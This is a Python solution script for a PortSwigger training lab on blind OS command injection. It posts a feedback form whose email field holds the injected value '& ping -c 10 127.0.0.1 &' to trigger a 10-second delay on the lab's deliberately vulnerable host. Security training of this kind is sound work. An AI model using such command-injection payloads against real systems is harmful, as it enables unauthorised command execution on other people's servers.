#!/usr/bin/env python


'''This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

Lab link: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
'''

import requests
from bs4 import BeautifulSoup

lab_id = '0a87001f049bf07b807817690038001e' #change based on generated lab
payload ='& ping -c 10 127.0.0.1 &' # this will cause a 10 second time delay
s = requests.session()

def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']

def main():
    uri = f"https://{lab_id}.web-security-academy.net/feedback"  # go here first to get the csrf token
    r1 = s.get(uri) 
    token = token_extract(r1.text) # feedback csrf token

    # Trigger os injection from the feedback submission
    uri = f"https://{lab_id}.web-security-academy.net/feedback/submit"
    data = {
        'csrf': token,
        'name' : 'hey', 
        'email' : payload,
        'subject' : 'hey',
        'message' : 'hey'
    }
    r2 = s.post(uri, data=data)
    print('done')

if __name__ == '__main__':
    main()